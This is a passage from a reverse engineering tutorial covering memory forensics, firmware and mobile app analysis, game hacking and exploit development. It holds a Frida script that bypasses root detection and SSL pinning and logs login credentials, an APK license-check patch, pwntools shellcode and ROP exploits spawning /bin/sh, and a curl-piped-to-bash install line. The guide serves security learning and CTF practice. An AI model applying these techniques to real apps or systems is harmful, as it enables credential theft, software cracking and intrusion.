**Kernel Debugger Commands (WinDbg):**

```
# List all processes (including hidden ones)
!process 0 0

# Check for SSDT hooks
# (Compare SSDT entries against expected ntoskrnl addresses)

# List loaded drivers
!drivers
lm m *

# Check for hooks in system functions
bp nt!NtCreateFile
# Then check if it jumps to unexpected module
```

**Detection tools:**

- **GMER** — scans for rootkit modifications
- **RootkitRevealer** — compares what OS reports vs direct disk reads
- **Volatility** — memory forensics (see below)

### Memory Forensics with Volatility

Volatility analyzes memory dumps to find hidden malware:

```bash
pip install volatility3

# Get basic OS info
vol.py -f memory.dmp windows.info

# List processes (including hidden)
vol.py -f memory.dmp windows.pslist
vol.py -f memory.dmp windows.pstree

# Find injected code
vol.py -f memory.dmp windows.malfind

# Network connections
vol.py -f memory.dmp windows.netstat

# Loaded DLLs for a process
vol.py -f memory.dmp windows.dlllist --pid 1234

# Dump a process to disk
vol.py -f memory.dmp windows.procdump --pid 1234 --dump-dir ./

# Check registry for persistence
vol.py -f memory.dmp windows.registry.printkey \
  --key "Software\Microsoft\Windows\CurrentVersion\Run"
```

---

## 14. Firmware and IoT Reverse Engineering

### What is Firmware?

Firmware is software permanently stored in a device (router, camera, smart bulb). It often has hidden backdoors, hardcoded credentials, and vulnerabilities.

### Extracting Firmware

```bash
# Method 1: From manufacturer update files
binwalk -e firmware_update.bin

# Method 2: From running device (if you have SSH/Telnet)
cat /dev/mtd0 > /tmp/firmware.bin
# Transfer via SCP

# Method 3: Physical SPI flash extraction
# Use CH341A programmer + SOIC clip
flashrom -p ch341a_spi -r firmware.bin

# Method 4: UART access
# Find UART pins on PCB (TX, RX, GND, VCC)
# Connect USB-to-serial adapter
# Open terminal at 115200 baud
# Interrupt bootloader, dump flash
```

### Analyzing Firmware

```bash
# Identify what's inside
binwalk firmware.bin

# Example output:
# 0x00000000    uImage header
# 0x00000040    LZMA compressed data
# 0x00100000    Squashfs filesystem

# Extract everything automatically
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# Look for interesting files
find . -name "passwd" -o -name "shadow" -o -name "*.conf"

# Check for hardcoded credentials
grep -r "password\|passwd\|admin" etc/
cat etc/passwd
cat etc/shadow

# Find what architecture the binaries are
file bin/busybox
# ARM, MIPS, PowerPC, x86...
```

### Running Firmware in QEMU (Emulation)

```bash
# Run an ARM binary without actual hardware
apt install qemu-user-static

# Run single ARM binary on your Linux PC
qemu-arm-static -L /usr/arm-linux-gnueabihf ./arm_binary

# Debug it
qemu-arm-static -g 1234 ./arm_binary &
gdb-multiarch ./arm_binary
(gdb) target remote :1234
(gdb) continue
```

---

## 15. Mobile Reverse Engineering

### Android APK Analysis

An APK is just a ZIP file containing:

- `AndroidManifest.xml` — permissions, components
- `classes.dex` — the compiled Java/Kotlin code (Dalvik bytecode)
- `lib/` — native .so libraries (compiled C/C++)
- `res/` — images, layouts, strings
- `assets/` — arbitrary files

```bash
# Install tools
pip install apktool jadx

# Method 1: Decompile to Smali (assembly-like)
apktool d app.apk -o app_decoded/
# Now you can read/modify and recompile

# Method 2: Decompile to Java (easier to read)
jadx app.apk -d output_dir/

# Look for secrets in the code
grep -r "api_key\|password\|secret\|http" output_dir/

# Check permissions in manifest
cat app_decoded/AndroidManifest.xml | grep "permission"
```

**Dangerous permissions to watch for:**

- `READ_SMS` — can read your text messages
- `RECORD_AUDIO` — can use microphone
- `ACCESS_FINE_LOCATION` — GPS tracking
- `READ_CONTACTS` — steals contact list
- `CAMERA` — can take photos silently

### Frida for Android (Bypass SSL, Root Detection, etc.)

```javascript
// android_bypass.js

Java.perform(function () {
  // === Bypass Root Detection ===
  var RootCheck = Java.use('com.example.app.RootDetector')
  RootCheck.isRooted.implementation = function () {
    console.log('[+] Root check bypassed!')
    return false
  }

  // === Bypass SSL Certificate Pinning ===
  // (Allows you to MITM the app's HTTPS traffic)
  var TrustManager = Java.use('com.android.org.conscrypt.TrustManagerImpl')
  TrustManager.checkTrustedRecursive.implementation = function () {
    console.log('[+] SSL pinning bypassed!')
    return Java.use('java.util.ArrayList').$new()
  }

  // === Log login credentials ===
  var LoginActivity = Java.use('com.example.app.LoginActivity')
  LoginActivity.login.implementation = function (username, password) {
    console.log('[+] Login called:')
    console.log('    Username: ' + username)
    console.log('    Password: ' + password)
    return this.login(username, password) // Call original
  }
})
```

```bash
# Run against a device/emulator
frida -U -f com.example.app -l android_bypass.js --no-pause
```

### Patching APKs (Modify and Repackage)

```bash
# 1. Decode
apktool d app.apk -o app_decoded

# 2. Modify Smali code (assembly-like Java)
# Example: Find checkLicense method, make it always return true
# Change: return v0  (where v0 might be false)
# To:     const/4 v0, 0x1
#         return v0

# 3. Recompile
apktool b app_decoded -o app_patched.apk

# 4. Sign (required to install)
keytool -genkey -v -keystore debug.keystore -alias mykey \
        -keyalg RSA -keysize 2048 -validity 10000
jarsigner -keystore debug.keystore app_patched.apk mykey

# 5. Install on device
adb install app_patched.apk
```

### iOS App Analysis

```bash
# Extract IPA (must be decrypted first)
# Use frida-ios-dump or similar on jailbroken device

unzip app.ipa

# Get linked libraries
otool -L Payload/App.app/App

# Get class list (Objective-C)
class-dump Payload/App.app/App > classes.txt

# Find interesting methods
grep -i "password\|login\|auth\|pin\|token" classes.txt

# Search for hardcoded secrets
strings Payload/App.app/App | grep -i "key\|secret\|token"
```

---

## 16. Game Hacking

> **For educational purposes — understanding anti-cheat systems, memory scanning, and protection mechanisms.**

### How Game Trainers Work

Games store values in memory (health, ammo, gold). You find those memory addresses and modify them.

**Finding values with Cheat Engine:**

1. Attach Cheat Engine to game process
2. Scan for current value (e.g., health = 100)
3. Take damage in game, health changes to 85
4. "Next scan" for value 85
5. Repeat until 1-3 addresses remain
6. Right-click → "Find what writes to this address" to understand the code
7. Freeze the value or set it to 9999

### Pointer Chains

Games usually don't store health at a fixed address — they use pointer chains (like C `struct` navigation):

```
Base address: game.exe + 0x123456  →  points to object  →  +0x10  →  +0x20  →  health value
```

In C++ terms: `*(*(*(game_base + 0x123456)) + 0x10) + 0x20)`

```cpp
// Resolving a pointer chain in code
uintptr_t base = GetModuleBase("game.exe");
uintptr_t addr = base + 0x123456;  // Start

// Follow pointers
ReadProcessMemory(hProcess, (LPCVOID)addr, &addr, 8, NULL);  // Dereference
addr += 0x10;
ReadProcessMemory(hProcess, (LPCVOID)addr, &addr, 8, NULL);  // Dereference again
addr += 0x20;
// addr now points to health
```

### How Anti-Cheat Works

| Method                | What It Does                               | Bypass Difficulty                |
| --------------------- | ------------------------------------------ | -------------------------------- |
| Memory scanning       | Scans for cheat signatures                 | Medium — modify your code        |
| Debugger detection    | Detects if you're debugging the game       | Medium — anti-anti-debug         |
| CRC checks            | Verifies game code isn't modified          | Hard — hook the check            |
| Driver-level (kernel) | Monitors from kernel (e.g., EasyAntiCheat) | Very Hard — needs kernel exploit |
| Server-side checks    | Server validates all game actions          | Impossible locally               |

---

## 17. Exploit Development

> **These techniques are used in authorized penetration testing, CTF competitions, and vulnerability research. Never attack systems you don't have permission to test.**

### Buffer Overflow — The Classic Vulnerability

A buffer overflow happens when a program writes more data than a buffer can hold, overwriting adjacent memory — including the **return address**.

```c
// vulnerable.c — DO NOT run this as-is
void vulnerable(char *input) {
    char buffer[64];    // Only 64 bytes
    strcpy(buffer, input);  // No length check!
    // If input > 64 bytes, we overflow into return address
}
```

**Memory layout during attack:**

```
High Address
┌─────────────────────┐
│  Your shellcode      │ ← You control this
├─────────────────────┤
│  AAAAAAAAAAAAAAA    │ ← Padding to fill buffer
├─────────────────────┤
│  [NEW RETURN ADDR]  │ ← You overwrite this!  ← CPU will jump here!
├─────────────────────┤
│  Saved RBP          │ ← Overwritten
├─────────────────────┤
│  Local buffer[64]   │ ← Your input fills this
└─────────────────────┘
Low Address
```

**Finding the offset:**

```python
# Step 1: Create a cyclic pattern (unique sequence)
# Every 4-byte group is unique, so when EIP/RIP is overwritten
# with part of the pattern, you know the exact offset

# Using pwntools
from pwn import *
pattern = cyclic(200)
print(pattern)
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa...

# Run program with this pattern, it crashes
# Check EIP/RIP value in debugger
# Then:
offset = cyclic_find(0x6161616c)  # The value that was in EIP
print(f"Offset: {offset}")        # e.g., Offset: 76
```

**Writing a basic exploit:**

```python
# exploit.py
from pwn import *

# Connect to target
p = process('./vulnerable')
# p = remote('ctf.example.com', 1337)  # For remote target

offset = 76  # Bytes until we reach return address

# NOP sled + shellcode (Linux x64 execve /bin/sh)
shellcode = asm(shellcraft.sh())
nop_sled = b'\x90' * 20   # NOP = do nothing, slide into shellcode

# Build payload
payload = nop_sled
payload += shellcode
payload += b'A' * (offset - len(payload))  # Padding

# Return address pointing back into our NOP sled
ret_addr = 0x7fffffffde00  # Find this with GDB: x/100x $rsp
payload += p64(ret_addr)

p.sendline(payload)
p.interactive()  # Get shell!
```

### Modern Protections and Bypasses

| Protection       | What it does                                          | Bypass technique                         |
| ---------------- | ----------------------------------------------------- | ---------------------------------------- |
| **ASLR**         | Randomizes memory addresses                           | Leak an address first, calculate base    |
| **NX / DEP**     | Makes stack non-executable                            | ROP chains (return-oriented programming) |
| **Stack Canary** | Random value before return address, checked on return | Leak the canary value first              |
| **PIE**          | Randomizes executable base address                    | Leak a code pointer first                |

**ROP Chains — Bypassing Non-Executable Stack:**

Instead of running your shellcode, you chain together small pieces of existing code (called "gadgets") that end with `ret`:

```python
from pwn import *

elf = ELF('./vulnerable')
rop = ROP(elf)

offset = 72

# Find gadgets: pop rdi; ret
# (Used to set first argument for function calls)
pop_rdi = 0x4011d3

# Address of "/bin/sh" string in binary
bin_sh  = 0x404030

# Address of system() function
system  = elf.plt['system']

payload  = b'A' * offset
payload += p64(pop_rdi)    # Gadget: pop rdi; ret
payload += p64(bin_sh)     # Value to pop into rdi (argument to system)
payload += p64(system)     # Call system("/bin/sh")

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

---

## 18. Tools Reference

### Complete Tool List

**Disassemblers / Decompilers:**

| Tool         | Platform  | Cost      | Best For                   |
| ------------ | --------- | --------- | -------------------------- |
| Ghidra       | All       | Free      | Best free option, NSA-made |
| IDA Pro      | All       | Expensive | Industry standard          |
| Binary Ninja | All       | $$        | Modern, great scripting    |
| radare2      | All       | Free      | CLI power users            |
| Hopper       | Mac/Linux | $$        | Mach-O binaries            |

**Debuggers:**

| Tool             | Platform  | Best For                      |
| ---------------- | --------- | ----------------------------- |
| GDB + GEF/pwndbg | Linux     | Linux programs, exploitation  |
| x64dbg           | Windows   | Windows user-mode debugging   |
| WinDbg           | Windows   | Kernel debugging, crash dumps |
| LLDB             | Mac/Linux | macOS/iOS debugging           |

**Dynamic Analysis:**

| Tool            | Use                             |
| --------------- | ------------------------------- |
| Frida           | Runtime hooking (all platforms) |
| Intel Pin       | Binary instrumentation          |
| Wireshark       | Network traffic                 |
| Process Monitor | Windows file/registry/network   |
| INetSim         | Simulate internet for malware   |
| Cuckoo Sandbox  | Automated malware analysis      |

**Mobile:**

| Tool       | Use                       |
| ---------- | ------------------------- |
| apktool    | Decompile/recompile APKs  |
| jadx       | APK to readable Java      |
| MobSF      | Automated mobile analysis |
| class-dump | iOS Objective-C headers   |

**Exploitation:**

| Tool              | Use                           |
| ----------------- | ----------------------------- |
| pwntools (Python) | CTF exploitation framework    |
| ROPgadget         | Find ROP gadgets              |
| Metasploit        | Exploitation framework        |
| GDB-PEDA          | Enhanced GDB for exploitation |

### Tool Installation

```bash
# Linux - essential tools
sudo apt update
sudo apt install -y gdb python3 python3-pip binwalk \
                    radare2 file strings hexdump

# Python tools
pip3 install pwntools frida-tools pefile yara-python \
             capstone keystone-engine unicorn

# GEF (enhanced GDB)
bash -c "$(curl -fsSL https://gef.sh/)"

# Ghidra - download from https://ghidra-sre.org/
# Requires Java: sudo apt install default-jre
```

---

## 19. Practice Platforms

### Where to Learn and Practice

**Beginner-Friendly:**

| Platform        | URL                 | Focus                            |
| --------------- | ------------------- | -------------------------------- |
| PicoCTF         | picoctf.org         | Beginner CTF, great for learning |
| Microcorruption | microcorruption.com | Embedded/IoT reversing           |
| Crackmes.one    | crackmes.one        | Reversing challenges only        |
| CTFlearn        | ctflearn.com        | Mixed beginner challenges        |

**Intermediate:**

| Platform     | URL            | Focus                            |
| ------------ | -------------- | -------------------------------- |
| HackTheBox   | hackthebox.com | Real-world machines + challenges |
| TryHackMe    | tryhackme.com  | Guided learning paths            |
| Reversing.kr | reversing.kr   | Korean CTF, pure reversing       |
| pwnable.kr   | pwnable.kr     | Exploitation challenges          |

**Advanced:**

| Platform          | URL               | Focus                            |
| ----------------- | ----------------- | -------------------------------- |
| pwn.college       | pwn.college       | Exploitation (Arizona State Uni) |
| exploit.education | exploit.education | Exploitation VMs                 |
| RingZer0          | ringzer0ctf.com   | Advanced challenges              |

### Suggested Learning Path

```
Month 1-2: Foundations
  → Learn x86/x64 assembly basics
  → Solve 5-10 Crackmes on crackmes.one (Easy level)
  → Learn to use GDB and Ghidra

Month 3-4: Static Analysis
  → Solve PicoCTF reversing challenges
  → Analyze benign programs with Ghidra
  → Learn PE/ELF file formats

Month 5-6: Dynamic Analysis
  → Set up malware analysis VM
  → Practice with x64dbg
  → Try Microcorruption challenges

Month 7-9: Malware Analysis
  → Analyze real malware samples (theZoo on GitHub, in VM!)
  → Learn Frida, hook Windows APIs
  → Write YARA rules

Month 10-12: Exploitation Basics
  → Follow pwn.college curriculum (free, excellent)
  → Learn pwntools
  → Solve HackTheBox reversing + pwn challenges

Year 2+: Specialize
  → Mobile RE: Solve Android challenges on HackTheBox
  → Kernel: Study rootkits and kernel debugging
  → Firmware: Buy cheap routers from eBay, practice extraction
```

---

## 20. Career Paths and Resources

### Jobs in This Field

| Role                       | What You Do                                   | Salary (USD) |
| -------------------------- | --------------------------------------------- | ------------ |
| Malware Analyst            | Analyze malicious code, write detection rules | $80k–$150k   |
| Security Researcher        | Find 0-days, publish research                 | $100k–$300k+ |
| Penetration Tester         | Test company systems for vulnerabilities      | $70k–$140k   |
| Firmware Security Engineer | IoT/embedded device security                  | $90k–$160k   |
| Game Security Engineer     | Anti-cheat development                        | $80k–$150k   |
| Digital Forensics Analyst  | Investigate incidents, extract evidence       | $70k–$130k   |

### Books to Read

```
Beginner → Advanced:

1. "Hacking: The Art of Exploitation" - Jon Erickson
   (Best intro to low-level exploitation, includes assembly)

2. "Practical Malware Analysis" - Sikorski & Honig
   (The malware analysis bible)

3. "Reversing: Secrets of Reverse Engineering" - Eilam
   (Comprehensive RE theory and practice)

4. "Practical Binary Analysis" - Andriesse
   (Modern approach with ELF focus)

5. "The Art of Memory Forensics" - Ligh et al.
   (Memory analysis and volatility)

6. "Gray Hat Hacking" - Harris et al.
   (Broad ethical hacking coverage)
```

### Certifications

| Cert   | Who Gives It       | What It Covers              |
| ------ | ------------------ | --------------------------- |
| GREM   | GIAC/SANS          | Reverse Engineering Malware |
| OSCP   | Offensive Security | Penetration Testing         |
| OSEE   | Offensive Security | Advanced Exploitation       |
| FOR610 | SANS               | Malware RE course           |

### YouTube Channels

- **LiveOverflow** — best for low-level security learning
- **John Hammond** — CTF walkthroughs, malware analysis
- **OALabs** — malware analysis deep dives
- **Guided Hacking** — game hacking and RE
- **MalwareTech** — (WannaCry guy) security research

### Communities to Join

- **r/ReverseEngineering** — Reddit community
- **r/netsec** — broader security news
- **Discord: HackTheBox official** — active community
- **Twitter/X: #RevEng** — follow researchers
- **OpenSecurityTraining2** (ost2.fyi) — free advanced courses

---

## Quick Reference Cheatsheet

### GDB Commands

```
run / r          Start program
c                Continue
n                Next (step over)
s                Step into
ni               Next instruction
si               Step instruction into
finish           Run until return
bt               Backtrace (call stack)
break main       Breakpoint at main
break *0x401000  Breakpoint at address
info breakpoints List breakpoints
x/10i $rip       Show 10 instructions
x/20x $rsp       Show stack in hex
info registers   Show all registers
set $rax = 0     Modify register
```

### Frida Quick Start

```bash
frida -l script.js process_name    # Attach by name
frida -l script.js -p 1234         # Attach by PID
frida -U -f com.app -l script.js   # Android app
```

### pwntools Quick Start

```python
from pwn import *
p = process('./binary')    # Local
p = remote('host', port)   # Remote
payload = b'A' * offset + p64(address)
p.sendline(payload)
p.interactive()
```

### Useful Python One-Liners

```python
# XOR decrypt
dec = bytes([b ^ 0x42 for b in encrypted_bytes])

# Find pattern offset
from pwn import cyclic, cyclic_find
pattern = cyclic(200)
offset = cyclic_find(b'laaa')

# Hex dump
import binascii
print(binascii.hexlify(data))

# Pack address
import struct
addr = struct.pack('<Q', 0x401000)  # Little-endian 64-bit
```

---

_Last updated: 2026 | For ethical use, CTFs, and security research only_

_"Know your enemy" — Sun Tzu. Understanding attack techniques is essential for building defenses._
